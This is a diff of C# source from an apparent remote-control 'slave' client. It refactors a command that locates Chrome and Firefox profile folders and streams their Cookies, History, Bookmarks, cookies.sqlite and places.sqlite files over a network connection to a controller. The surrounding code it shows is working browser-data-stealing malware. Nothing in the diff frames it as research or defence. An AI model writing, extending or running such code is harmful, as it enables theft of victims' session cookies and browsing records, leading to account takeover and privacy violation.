@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using Slave.Core;
 
 namespace Slave.Commands
 {
@@ -22,26 +23,26 @@ namespace Slave.Commands
 
             if (Directory.Exists(chromePath))
             {
-                GlobalCommandsManager.networkManager.WriteLine("OK");
+                SlaveNetworkManager.GetInstance().WriteLine("OK");
                 FindAndSendFile(chromePath, "Cookies");
                 FindAndSendFile(chromePath, "History");
                 FindAndSendFile(chromePath, "Bookmarks");
             }
             else
             {
-                GlobalCommandsManager.networkManager.WriteLine("KO");
+                SlaveNetworkManager.GetInstance().WriteLine("KO");
             }
 
             if (Directory.Exists(firefoxPath))
             {
-                GlobalCommandsManager.networkManager.WriteLine("OK");
+                SlaveNetworkManager.GetInstance().WriteLine("OK");
                 firefoxPath = Path.Combine(Directory.GetDirectories(firefoxPath)[0]);
                 FindAndSendFile(firefoxPath, "cookies.sqlite");
                 FindAndSendFile(firefoxPath, "places.sqlite");
             }
             else
             {
-                GlobalCommandsManager.networkManager.WriteLine("KO");
+                SlaveNetworkManager.GetInstance().WriteLine("KO");
             }
         }
 
@@ -55,18 +56,18 @@ namespace Slave.Commands
                 {
                     using (var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
-                        GlobalCommandsManager.networkManager.WriteLine("OK");
-                        GlobalCommandsManager.networkManager.StreamToNetworkStream(fs);
+                        SlaveNetworkManager.GetInstance().WriteLine("OK");
+                        SlaveNetworkManager.GetInstance().StreamToNetworkStream(fs);
                     }
                 }
                 catch (IOException)
                 {
-                    GlobalCommandsManager.networkManager.WriteLine("KO");
+                    SlaveNetworkManager.GetInstance().WriteLine("KO");
                 }
             }
             else
             {
-                GlobalCommandsManager.networkManager.WriteLine("KO");
+                SlaveNetworkManager.GetInstance().WriteLine("KO");
             }
         }
     }
